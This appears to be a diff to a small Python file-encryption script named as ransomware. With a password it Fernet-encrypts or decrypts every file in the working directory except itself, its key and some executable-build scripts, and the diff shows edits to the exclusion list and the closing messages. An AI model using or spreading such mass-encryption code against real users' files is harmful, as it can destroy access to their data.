@@ -2,6 +2,8 @@ import os
 from cryptography.fernet import Fernet
 from pathlib import Path
 from getpass import getpass
+import sys
+
 
 password = getpass()
 
@@ -30,11 +32,12 @@ if key_file.exists():
 else:
     print("Cryptography")
     
-selfName = Path(__file__).name
+selfName = Path(sys.argv[0])._cparts[len(Path(sys.argv[0])._cparts) - 1]
+
 
 files = []
 for file in os.listdir():
-    if file == "ransonware.py" or file == "thekey.key" or file == "desktop.ini" or file == ".gitignore"  or file == "createexe.sh" or file == "create exe.txt" or file == "pythonScriptName.spec" or file == "ransonware.spec" or file == selfName:
+    if file == "ransonware.py" or file == "thekey.key" or file == "desktop.ini" or file == ".gitignore"  or file == "win_createexe.sh" or file == "linux_createexe.sh" or file == "create exe.txt" or file == "pythonScriptName.spec" or file == "ransonware.spec" or file == selfName:
         continue
     if os.path.isfile(file):
         files.append(file)
@@ -72,4 +75,7 @@ if crypto:
 else:
     os.remove(endereco)
     
-input('Finalizado.')
+if crypto:
+    input('Crypto finished: Keep with yourself the thekey.key in security place.')
+else:
+    input('Decrypto finished: Your file key was deleted.')
